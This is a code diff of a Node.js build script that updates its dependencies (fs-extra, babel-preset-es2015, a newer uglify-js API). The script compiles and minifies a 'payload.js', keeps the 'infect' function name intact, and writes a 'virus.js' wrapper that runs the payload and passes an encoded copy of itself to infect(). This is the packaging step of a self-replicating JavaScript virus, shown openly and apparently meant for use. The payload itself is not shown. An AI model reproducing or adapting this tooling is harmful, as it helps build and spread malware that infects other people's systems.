@@ -1,14 +1,15 @@
-const fsp     = require( "fs-promise" );
+const fs      = require( "fs-extra" );
+const babel   = require( "babel-core" );
 const winston = require( "winston" );
 const ugly    = require( "uglify-js" );
-const babel   = require( "babel-core" );
 
 async function build() {
-    var src  = await fsp.readFile( "payload.js", "utf8" );
-    var compiledES16 = babel.transform( src, { presets : require.resolve( "babel-preset-es2017" ) } ).code;
-    var payload = encodeURI( ugly.minify( compiledES16, { fromString : true, mangle : { except : [ "infect" ] } } ).code );
+    var src = await fs.readFile( "payload.js", "utf8" );
+    var compiled = babel.transform( src, { presets : require.resolve( "babel-preset-es2015" ) } ).code;
+    var minified = ugly.minify( compiled, { mangle : { reserved : [ "infect" ] } } );
+    var payload = encodeURI(minified.code);
 
-    await fsp.writeFile( "virus.js", `(function() {
+    await fs.writeFile( "virus.js", `(function() {
         ${decodeURI(payload)} 
         infect( "${payload}" );
     })();` );
